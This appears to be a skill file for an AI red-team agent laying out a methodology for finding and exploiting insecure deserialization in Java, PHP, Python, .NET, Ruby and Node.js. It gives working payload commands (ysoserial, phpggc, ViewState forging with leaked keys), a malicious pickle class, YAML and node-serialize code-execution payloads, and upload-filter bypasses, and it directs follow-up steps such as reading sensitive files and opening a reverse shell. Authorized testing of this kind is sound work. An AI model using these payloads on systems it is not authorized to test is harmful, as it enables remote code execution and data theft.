---
name: deserialization-testing
description: Insecure deserialization detection and gadget chain exploitation
origin: RedteamOpencode
---

# Insecure Deserialization Testing

## When to Activate

- Binary or encoded blobs in cookies, parameters, or hidden fields
- Known serialization signatures in traffic
- Application uses Java (RMI, JMX), PHP, Python (pickle), or .NET

## Tools

- ysoserial (Java gadget chains)
- phpggc (PHP gadget chains)
- Burp Suite (Java Deserialization Scanner extension)
- ppickle exploit generator (Python)
- Custom scripts for .NET formatters

## Methodology

### 1. Identify Serialized Data

- [ ] Java: magic bytes `ac ed 00 05` (hex) or `rO0AB` (base64)
- [ ] PHP: `O:4:"User":2:{s:4:"name";...}` or `a:2:{...}`
- [ ] Python pickle: `\x80\x04\x95` header or `cos\nsystem\n` patterns
- [ ] .NET: `AAEAAAD/////` (base64 BinaryFormatter), XML with `<a1:` namespace
- [ ] Check cookies, ViewState, session storage, message queues, API params
- [ ] Check `Content-Type`: `application/x-java-serialized-object`, `application/x-php-serialized`

### 2. Java Deserialization

- [ ] Generate payloads with ysoserial:
      `java -jar ysoserial.jar CommonsCollections1 "id" | base64`
- [ ] Test common gadget chains: CommonsCollections1-7, Spring, Groovy, Hibernate
- [ ] Identify libraries in classpath from error messages or probing
- [ ] Test via cookies, POST body, RMI endpoints, JMX, T3 (WebLogic)
- [ ] Blind: DNS/HTTP callback payload to confirm execution

### 3. PHP Deserialization

- [ ] Modify serialized object: change property values
- [ ] Type juggling: change types in serialized data
- [ ] Generate payloads with phpggc:
      `phpggc Laravel/RCE1 system id`
- [ ] Target `__wakeup()`, `__destruct()`, `__toString()` magic methods
- [ ] `__wakeup()` bypass via object count mismatch: increment the declared property count in the serialized string (`O:4:"User":2:{...}` → `O:4:"User":3:{...}`) — some PHP versions skip calling `__wakeup()` entirely when the declared count doesn't match, which can also bypass validation logic that relies on `__wakeup()`
- [ ] Phar deserialization: upload `.phar` file, trigger via `phar://` wrapper — this reaches `unserialize()` through ANY filesystem function that accepts a `phar://` stream (`file_exists`, `getimagesize`, `md5_file`, `fopen`), not just an explicit unserialize call
- [ ] Phar polyglot upload bypass: prepend valid image magic bytes (`GIF89a`) before the Phar stub so an image-type upload filter accepts the file while the trailing Phar metadata still deserializes when later accessed via `phar://uploaded.jpg`

### 4. Python Pickle

- [ ] Craft malicious pickle:
      ```python
      import pickle, os
      class Exploit:
          def __reduce__(self):
              return (os.system, ('id',))
      pickle.dumps(Exploit())
      ```
- [ ] Test in cookies, session data, API payloads, cached objects
- [ ] Blind: use DNS/HTTP callback as command

### 5. .NET Deserialization

- [ ] Identify formatter: BinaryFormatter, DataContractSerializer, Json.NET
- [ ] ViewState deserialization (if MAC validation disabled)
- [ ] Generate payloads with ysoserial.net:
      `ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd /c id"`
- [ ] Test TypeNameHandling in Json.NET: `"$type":` property injection
- [ ] ViewState with a KNOWN machine key (leaked in a config, GitHub, Blazor/Telerik default sample keys) — generate a MAC-valid malicious ViewState even when MAC validation IS enabled:
      `ysoserial.exe -p ViewState -g TextFormattingRunProperties --generator="<generator-id>" --validationalg="SHA1" --validationkey="<leaked-key>" -c "cmd /c id"`
- [ ] Blind MAC-less ViewState detection: submit a tampered ViewState with no signature and check whether the app throws a MAC-validation error (confirms MAC IS enforced) vs. a generic deserialization error (confirms it is NOT — direct RCE path)

### 5b. Ruby Marshal & YAML.load

- [ ] Ruby `Marshal.load` on cookies/session data: signature starts with `\x04\x08` — identify via cookie/session-store inspection before probing
- [ ] Unsafe YAML loading across languages — treat as its own class distinct from binary Marshal/pickle formats: Ruby `YAML.load` (not `safe_load`) accepts `!ruby/object:` tags that instantiate arbitrary classes; Python `yaml.load` (not `safe_load`/`SafeLoader`) accepts `!!python/object/apply:os.system` tags; Java SnakeYAML accepts `!!<fully.qualified.ClassName>` tags reaching arbitrary constructors/setters
      ```yaml
      !!python/object/apply:os.system ["id"]
      ```
      ```yaml
      --- !ruby/object:Gem::Requirement
      ```
- [ ] Confirm which loader function is in use (safe vs. unsafe) before assuming YAML input is a dead end — many apps use the unsafe default without realizing it

### 5c. Node.js `node-serialize`

- [ ] Signature: `_$$ND_FUNC$$_function(){...}()` inside a serialized JS object — if present, the app is using the vulnerable `node-serialize` package pattern
      ```
      {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id', function(e,o,r){});}()"}
      ```
- [ ] Applies wherever session data or a cookie is JS-object-serialized and later run through `unserialize()` from that package rather than `JSON.parse`

### 6. Impact Validation

- [ ] Confirm code execution with `id`, `whoami`, or DNS callback
- [ ] Read sensitive files
- [ ] Establish reverse shell if in scope
- [ ] Check if deserialized data affects application logic (role, permissions)

### 7. Data Tampering (Non-RCE)

- [ ] Modify user role/privilege in serialized session
- [ ] Change object references to access other users' data
- [ ] Alter numeric values (price, quantity, balance)

## What to Record

- Endpoint and parameter carrying serialized data
- Serialization format and language
- Gadget chain used (if RCE)
- Proof of execution (command output or callback)
- Libraries enabling the chain
- Severity: Critical (RCE) or High (data tampering)
- Remediation: avoid native deserialization, use allowlists, sign serialized data
